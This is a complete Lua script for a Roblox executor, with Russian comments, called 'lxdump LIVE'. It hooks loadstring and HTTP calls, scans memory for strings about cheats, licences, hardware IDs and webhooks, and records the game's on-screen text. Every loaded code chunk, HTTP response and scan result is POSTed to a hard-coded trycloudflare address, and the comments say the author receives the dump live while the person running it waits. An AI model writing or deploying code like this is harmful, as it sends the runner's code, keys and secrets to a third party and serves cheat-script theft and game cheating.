-- lxdump LIVE — дамп летит напрямую мне: каждый чанк/скачка/скан уходит
-- на приёмник сразу, как только пойман. Если сеть упала — копия всё равно
-- пишется в workspace/IxryDump.
-- Запуск: 1) этот файл, 2) ждёшь "[lxdump LIVE] on", 3) твой скрипт,
--         4) ВЫБОР ИГРЫ, 5) 2-3 минуты ждём — я у себя уже всё вижу.

if getgenv()._LXD_ON then warn("[lxdump] уже работает"); return end
getgenv()._LXD_ON = true

local PUSH_URL = "https://creatures-bulletin-milan-teach.trycloudflare.com/dump"

local OK = function(f, ...) local r = {pcall(f, ...)} return unpack(r) end
pcall(makefolder, "IxryDump")
OK(writefile, "IxryDump/_log.txt", ("[lxdump LIVE] старт %s\n"):format(os.time()))
local LOG = function(s)
    OK(appendfile, "IxryDump/_log.txt", s .. "\n")
    warn(s)
end

-- ===== отправка на мой приёмник (request/http_request/RequestAsync) =====
local function httpPost(url, body)
    local req = request or http_request or (syn and syn.request) or (http and http.request)
    if req then
        local ok, res = pcall(req, {
            Url = url, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
        if ok then return true end
    end
    if game.RequestAsync then
        local ok = pcall(function()
            game:RequestAsync({ Url = url, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" }, Body = body })
        end)
        return ok
    end
    return false
end

local Http = game:GetService("HttpService")
local seq = 0
local function push(name, data)
    seq = seq + 1
    local enc = OK(function() return Http:JSONEncode({ name = name, data = data }) end)
    if type(enc) ~= "string" then return end
    -- резка >1.8МБ на части (мобильный request может душить большие тела)
    if #enc > 1800000 then
        local part, n = 1, math.ceil(#data / 1500000)
        for i = 1, n do
            local chunk = data:sub((i - 1) * 1500000 + 1, i * 1500000)
            local penc = OK(function() return Http:JSONEncode({ name = ("%s.part%d"):format(name, part), data = chunk }) end)
            if type(penc) == "string" then OK(httpPost, PUSH_URL, penc) end
            part = part + 1
            if task and task.wait then pcall(task.wait, 0.2) end
        end
    else
        OK(httpPost, PUSH_URL, enc)
    end
end

-- рукопожатие
OK(push, "_hello_from_client.txt", "lxdump LIVE поднят, время " .. tostring(os.time()))

-- ===== 1. loadstring: каждый чанк ко мне =====
local chunkN = 0
local seen = {}
local raw_ls = loadstring
getgenv().loadstring = function(src, ...)
    local argv = {...}
    OK(function()
        if type(src) == "string" and #src > 4 then
            local sig = #src .. src:sub(1, 40)
            if seen[sig] then return end
            seen[sig] = true
            chunkN = chunkN + 1
            local fname = ("chunk_%03d.lua"):format(chunkN)
            OK(writefile, "IxryDump/" .. fname, src)
            local args = {}
            for i, v in ipairs(argv) do args[#args + 1] = ("arg%d=%q"):format(i, tostring(v):sub(1, 60)) end
            OK(appendfile, "IxryDump/_chain.log",
                ("[%s] #%d len=%d %s\n"):format(os.date("%H:%M:%S"), chunkN, #src, table.concat(args, " ")))
            LOG(("[lxdump] chunk #%d (%d байт) -> push"):format(chunkN, #src))
            push(fname, src)
            push("_chain.log", ("#%d len=%d %s\n"):format(chunkN, #src, table.concat(args, " ")))
        end
    end)
    return raw_ls(src, ...)
end
LOG("[lxdump] loadstring обёрнут")

-- ===== 2. HTTP-перехват через __namecall =====
local httpN = 0
local function saveHttp(tag, url, body)
    httpN = httpN + 1
    local line = ("%s\t%s\t%s байт\n"):format(tag, tostring(url), type(body) == "string" and #body or -1)
    OK(appendfile, "IxryDump/urls.txt", line)
    OK(push, "urls.txt", line)
    if type(body) == "string" and #body > 30 then
        local fname = ("http_%03d.lua"):format(httpN)
        OK(writefile, "IxryDump/" .. fname, ("-- %s %s\n"):format(tag, tostring(url)) .. body)
        LOG(("[lxdump] http #%d %s (%d б) -> push"):format(httpN, tostring(url), #body))
        push(fname, ("-- %s %s\n"):format(tag, tostring(url)) .. body)
    end
end

local httpOn = false
pcall(function()
    if hookmetamethod then
        local old
        old = hookmetamethod(game, "__namecall", function(self, ...)
            local args = {...}
            local method = getnamecallmethod and getnamecallmethod() or ""
            local res = old(self, ...)
            if self == game and (method == "HttpGet" or method == "HttpGetAsync") then
                OK(saveHttp, method, args[1], res)
            elseif method == "RequestAsync" then
                OK(function()
                    local req = args[1]
                    saveHttp("RequestAsync", (type(req) == "table" and req.Url) or req,
                        type(res) == "table" and res.Body or nil)
                end)
            end
            return res
        end)
        httpOn = true
    end
end)
LOG("[lxdump] http " .. (httpOn and "через __namecall — есть" or "НЕ перехватывается"))

-- ===== 3. скан памяти + отправка срезов =====
local KEYS = {"silent","aim","esp","raycast","hitbox","noclip","fly","speed","teleport",
    "kill","sheriff","murder","innocent","camera","head","torso","chams","tracer","fov",
    "trigger","flick","prediction","autoshoot","pickup","hwid","webhook","license",
    "whitelisted","target","shoot","godmode","spin","parry","blade"}
local function kwHit(s)
    local l, hits = s:lower(), {}
    for _, k in ipairs(KEYS) do
        if l:find(k, 1, true) then hits[#hits + 1] = k end
    end
    if #hits > 0 then return table.concat(hits, ",") end
end

function scanMem(tag)
    LOG("[lxdump] скан " .. tostring(tag))
    local out, seenS, seenT = {}, {}, {}
    if getgc then
        local ok, gc = pcall(getgc, true)
        if ok then
            for _, x in ipairs(gc) do
                local tx = type(x)
                if tx == "string" and #x >= 4 and #x <= 2000 and not seenS[x] then
                    seenS[x] = true
                    local h = kwHit(x)
                    if h then out[#out + 1] = ("[STR %s] %s"):format(h, x) end
                elseif tx == "table" and not seenT[x] then
                    seenT[x] = true
                    OK(function()
                        local plain, n = {}, 0
                        for k, v in pairs(x) do
                            n = n + 1
                            if n > 500 then break end
                            local ks, vs = tostring(k), (type(v) == "string" and v or tostring(v))
                            if #ks < 150 and #vs < 400 then
                                local h = kwHit(ks) or kwHit(vs)
                                if h then plain[#plain + 1] = ("%s=%q"):format(ks, vs) end
                            end
                        end
                        if #plain > 0 then out[#out + 1] = "[TBL] " .. table.concat(plain, " | ") end
                    end)
                end
            end
        end
    end
    local body = table.concat(out, "\n")
    OK(appendfile, "IxryDump/keywords_" .. tag .. ".txt", body .. "\n")
    OK(push, "keywords_" .. tag .. ".txt", body)
    LOG(("[lxdump] скан %s: %d хитов -> push"):format(tag, #out))
end
getgenv().LXD_SCAN = scanMem

-- ===== 4. срез UI (имена фич из кнопок) =====
local function scanGui(tag)
    local lines, seen = {}, {}
    pcall(function()
        local roots = {}
        pcall(function() roots[#roots + 1] = (gethui and gethui()) or game:GetService("CoreGui") end)
        pcall(function() local lp = game:GetService("Players").LocalPlayer; if lp then roots[#roots + 1] = lp:FindFirstChildOfClass("PlayerGui") end end)
        local function walk(inst, depth, path)
            if depth > 16 or #lines > 4000 or not inst then return end
            if seen[inst] then return end
            seen[inst] = true
            local cls, nm, txt = "", "", ""
            pcall(function() cls = inst.ClassName end)
            pcall(function() nm = inst.Name end)
            if cls == "TextLabel" or cls == "TextButton" then pcall(function() txt = inst.Text end) end
            if (txt and txt ~= "") then
                lines[#lines + 1] = ("%s | %s"):format(path ~= "" and path or nm, txt:sub(1, 160))
            end
            local ch; pcall(function() ch = inst:GetChildren() end)
            if ch then for _, c in ipairs(ch) do walk(c, depth + 1, (nm ~= "" and (path ~= "" and path .. "/" .. nm or nm)) or path) end end
        end
        for _, r in ipairs(roots) do if r then walk(r, 0, "") end end
    end)
    local body = table.concat(lines, "\n")
    OK(appendfile, "IxryDump/gui_" .. tag .. ".txt", body .. "\n")
    OK(push, "gui_" .. tag .. ".txt", body)
    LOG(("[lxdump] gui %s: %d текстов -> push"):format(tag, #lines))
end
getgenv().LXD_GUI = scanGui

-- ===== таймеры =====
local dl = (task and task.delay) or delay
if dl then
    OK(dl, 20, function() scanMem("t20") end)
    OK(dl, 45, function() scanMem("t45"); scanGui("t45") end)
    OK(dl, 75, function() scanMem("t75"); scanGui("t75") end)
    OK(dl, 110, function() scanMem("t110"); scanGui("t110"); LOG("[lxdump] финальные срезы отправлены") end)
else
    LOG("[lxdump] delay нет — сканы по чанкам; вручную: LXD_SCAN('x') / LXD_GUI('x')")
end

LOG("[lxdump LIVE] on — запускай скрипт, выбери игру, жди ~2 мин")
print("[lxdump LIVE] on")
